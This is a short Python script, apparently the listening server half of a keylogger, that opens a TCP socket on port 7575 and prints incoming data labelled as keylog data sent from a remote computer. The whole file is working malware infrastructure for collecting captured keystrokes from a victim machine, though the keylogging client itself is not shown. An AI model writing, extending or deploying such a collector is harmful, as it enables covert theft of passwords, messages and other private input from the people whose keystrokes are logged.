#this server recievese that keylog data from a remote computer
import socket

HOST = '0.0.0.0'
PORT = 7575

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST,PORT))
        server_socket.listen()

        print(f"Listening on {HOST}:{PORT}...")
        conn, addr = server_socket.accept()
        with conn:
            print(f"Connected wit {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(f"Keylog data: {data.decode('utf-8')}")


if __name__ == "__main__":
    start_server()
